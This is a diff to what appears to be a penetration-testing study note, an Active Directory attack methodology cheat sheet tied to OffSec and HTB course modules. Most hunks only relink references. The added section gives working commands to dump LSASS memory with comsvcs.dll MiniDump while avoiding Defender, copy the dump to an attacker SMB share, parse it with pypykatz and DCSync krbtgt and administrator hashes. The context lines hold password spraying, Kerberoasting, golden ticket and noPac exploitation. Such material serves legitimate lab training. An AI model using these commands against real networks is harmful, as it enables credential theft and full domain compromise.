@@ -1,6 +1,6 @@
 # Active Directory Methodology
 
-Part of [[METHODOLOGY CHEAT SHEET]]. AD enumeration → password attacks → lateral movement → post-exploitation/persistence, phase-ordered. See also [[03_ACTIVE_DIRECTORY_BIBLE]] for deeper AD attack-path material.
+Part of [[METHODOLOGY CHEAT SHEET]]. AD enumeration → password attacks → lateral movement → post-exploitation/persistence, phase-ordered. The core module arc starts at [[22. Active Directory Introduction and Enumeration]]; see also [[23. Attacking Active Directory Authentication]] and [[24. Lateral Movement in Active Directory]]. See [[03_ACTIVE_DIRECTORY_BIBLE]] for deeper AD attack-path material.
 
 ---
 
@@ -69,7 +69,7 @@ Key things to look for in shares:
 - Config files, scripts, `.txt` files with credentials in custom shares (docshare, Users, backup)
 - Folders named "do-not-share", almost always misconfigured and very much shared
 
-Full reference: [[Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]]
+Full reference: [[22. Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]]
 
 #### Step 4: Service Principal Names (SPNs)
 ```powershell
@@ -171,7 +171,7 @@ Exploitable ACE types:
 - `Self-Membership` = add yourself to a group
 - `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` = DCSync
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.9. ACL Enumeration|AD.9]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.9]]
 
 #### Step 9: SPN / Kerberoast Candidate Discovery
 
@@ -203,7 +203,7 @@ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD
 Snaffler.exe -d DOMAIN.LOCAL -s -v data
 ```
 
-Full reference: [[Password Attacks (HTB Supplementary)#PA.17.4. Snaffler. Automated Interesting-File Finder|PA.17.4]] (per-host), [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.7.2. Snaffler Domain-Wide Scan|AD.7.2]] (domain-wide)
+Full reference: [[16. Password Attacks|PA.17.4]] (per-host), [[22. Active Directory Introduction and Enumeration|AD.7.2]] (domain-wide)
 
 ---
 
@@ -223,7 +223,7 @@ kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/seclists/Usernames/xato-ne
 ```
 Valid usernames returned by kerbrute (Kerberos says "pre-auth required" vs "no such user") are safe to spray.
 
-Full reference: [[Password Attacks (HTB Supplementary)#PA.20 kerbrute. Kerberos Username Enumeration & Spray|PA.20]], [[Password Attacks (HTB Supplementary)#PA.21 username-anarchy|PA.21]]
+Full reference: [[16. Password Attacks|PA.20]], [[16. Password Attacks|PA.21]]
 
 #### Tags: #kerbrute #usernameAnarchy #ADEnumeration #HTBSupplementary
 
@@ -257,7 +257,7 @@ Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 # Ctrl+C to stop; read captures: type Inveigh-NTLMv2.txt
 ```
 
-Crack captures with `hashcat -m 5600`. Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.3. LLMNR/NBT-NS Poisoning from Windows. Inveigh|AD.3]]
+Crack captures with `hashcat -m 5600`. Full reference: [[22. Active Directory Introduction and Enumeration|AD.3]]
 
 #### Step 2: Password Spraying
 
@@ -289,7 +289,7 @@ Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spray_success.txt -Erro
 
 > Module 23 lesson: crackmapexec -u pete spray across all subnet IPs reveals (Pwn3d!) where pete is local admin. Use `--continue-on-success` and spray a whole subnet: one valid cred might give local admin on a box the sprayer didn't expect.
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows. DomainPasswordSpray|AD.5]], [[Attacking Active Directory Authentication#23.2.1 Password Attacks (Spraying)|Module 23 §23.2.1]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.5]], [[23. Attacking Active Directory Authentication#23.2.1 Password Attacks (Spraying)|Module 23 §23.2.1]]
 
 #### Step 3: AS-REP Roasting
 ```bash
@@ -315,7 +315,7 @@ impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.com/user -outputfile hashes.
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 ```
 
-> Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN immediately (large offset kills the OpenVPN TLS session) → run impacket. See [[feedback-oscp-kerberos-clock-sync]].
+> Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN immediately (large offset kills the OpenVPN TLS session) → run impacket. See [[16. Password Attacks#Kerberos Clock Sync|Kerberos clock sync procedure in M16]].
 >
 > Rubeus over evil-winrm fails with "No credentials are available in the security package", evil-winrm authenticates via NTLM so there's no Kerberos TGT in the session. Use impacket from Kali instead.
 
@@ -361,7 +361,7 @@ export KRB5CCNAME=out.ccache
 evil-winrm -i <target> -r <domain>         # WinRM
 smbclient -k -N //<target>/share           # SMB with Kerberos
 ```
-Full reference: [[Password Attacks (HTB Supplementary)#PA.17 Pass the Certificate (PtC)|PA.17]], [[Secrets & Credentials (Decision Tree)#Got write access to an AD computer object|Decision Tree]]
+Full reference: [[16. Password Attacks|PA.17]], [[Secrets & Credentials (Decision Tree)#Got write access to an AD computer object|Decision Tree]]
 
 #### Tags: #PassTheCertificate #PtC #pywhisker #PKINITtools #HTBSupplementary
 
@@ -371,17 +371,38 @@ Full reference: [[Password Attacks (HTB Supplementary)#PA.17 Pass the Certificat
 
 #### Step 1: Extract Credentials
 
-**Mimikatz**:
+**Mimikatz (in-memory — works when Defender is off)**:
 ```cmd
 privilege::debug
-sekurlsa::logonpasswords
+sekurlsa::logonpasswords      ← requires Defender OFF or kiwi bypass; killed on patched hosts
 lsadump::sam
 lsadump::dcsync /user:domain\user
 ```
 
-**DCSync**:
+**comsvcs.dll MiniDump (Defender-safe LSASS dump — preferred on live engagements)**:
+```powershell
+# On target (requires SYSTEM):
+Get-Process lsass        # note the PID
+rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full
+# Silent = success. File should be ~45-50 MB.
+
+# Exfil to Kali via authenticated SMBserver:
+# (Kali)   impacket-smbserver share /tmp/share -smb2support -username kali -password kali
+# (Target) net use \\<KALI>\share /user:kali kali
+#          copy C:\Windows\Temp\lsass.dmp \\<KALI>\share\lsass.dmp
+```
+```bash
+# Parse offline on Kali:
+pypykatz lsa minidump /tmp/share/lsass.dmp
+# Look for: username + NT: <hash> + password: <cleartext>
+```
+See [[Active Directory (Breakdowns)#rundll32 comsvcs.dll MiniDump]], [[Active Directory (Decision Tree)#I have SYSTEM on a Windows target but Meterpreter kiwi / sekurlsa::logonpasswords is killed by Defender]], and [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]] for the full hands-on walkthrough.
+
+**DCSync (domain-level — requires DA or DCSync rights)**:
 ```cmd
-lsadump::dcsync /user:domain\krbtgt
+lsadump::dcsync /domain:DOMAIN.LOCAL /user:domain\krbtgt
+lsadump::dcsync /domain:DOMAIN.LOCAL /user:domain\administrator
+# RID 500 in output = genuine built-in Administrator account
 ```
 
 **Hash Dumping**:
@@ -439,7 +460,7 @@ kinit <user>@DOMAIN -k -t <file.keytab>
 # Use it
 smbclient -k -N //<target>/share
 ```
-Full reference: [[Password Attacks (HTB Supplementary)#PA.15 Pass the Ticket. Windows|PA.15]], [[Password Attacks (HTB Supplementary)#PA.16 Pass the Ticket. Linux|PA.16]]
+Full reference: [[16. Password Attacks|PA.15]], [[16. Password Attacks|PA.16]]
 
 #### Step 3: Golden Ticket
 ```cmd
@@ -579,7 +600,7 @@ Set-DomainObject -Credential $Cred2 -Identity <high_value_user> -SET @{servicepr
 # Cleanup: Set-DomainObject -Credential $Cred2 -Identity <high_value_user> -Clear serviceprincipalname
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.10]]
 
 #### Step 6: DCSync with runas /netonly (non-domain machine)
 
@@ -640,14 +661,14 @@ klist
 rem Verify: ls \\parentdc.parent.local\c$
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows. ExtraSids)|AD.16]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.16]]
 
 **Linux — raiseChild.py (automated):**
 ```bash
 impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Administrator:pass
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.17. Child→Parent Trust Attack (Linux, raiseChild.py)|AD.17]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.17]]
 
 #### Step 3: Cross-Forest Kerberoasting
 
@@ -663,7 +684,7 @@ GetUserSPNs.py -target-domain FOREIGN.FOREST.LOCAL OUROWN.LOCAL/user:pass -dc-ip
 # Use cracked credentials: smbexec.py FOREIGN.FOREST.LOCAL/user:pass@<foreign_dc_ip>
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.18. Cross-Forest Trust Abuse (Windows)|AD.18]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.19. Cross-Forest Trust Abuse (Linux)|AD.19]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.18]], [[22. Active Directory Introduction and Enumeration|AD.19]]
 
 ---
 
@@ -681,8 +702,8 @@ python3 noPac.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap \
   -shell --impersonate administrator
 ```
 
-Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.13. Bleeding Edge: NoPac (CVE-2021-42278 + CVE-2021-42287)|AD.13]]
+Full reference: [[22. Active Directory Introduction and Enumeration|AD.13]]
 
 ---
 
-#### Tags: #ActiveDirectory #ADEnum #ADAttacks #BloodHound #PowerView #Kerberoasting #ASREPRoasting #DCSync #GoldenTicket #PtH #PtT #PtC #ACLAbuse #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Methodology
+#### Tags: #ActiveDirectory #ADEnum #ADAttacks #BloodHound #PowerView #Kerberoasting #ASREPRoasting #DCSync #GoldenTicket #PtH #PtT #PtC #ACLAbuse #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Methodology #comsvcs #MiniDump #pypykatz #LSASS #NTLMRelay #Defender #Module27
